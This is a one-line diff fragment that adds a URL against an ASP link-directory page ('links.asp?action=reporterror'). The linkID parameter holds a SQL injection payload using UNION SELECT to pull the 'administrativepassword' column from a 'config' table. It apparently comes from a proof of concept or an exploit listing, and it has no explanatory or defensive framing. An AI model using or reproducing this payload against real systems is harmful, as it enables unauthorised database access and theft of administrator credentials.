@@ -1,0 +1,1 @@
+http://www.example.com/[path]/links.asp?action=reporterror&amp;linkID=221%20union%20select+0,administrativepassword,0,0,0,0,0,0,0+from+config
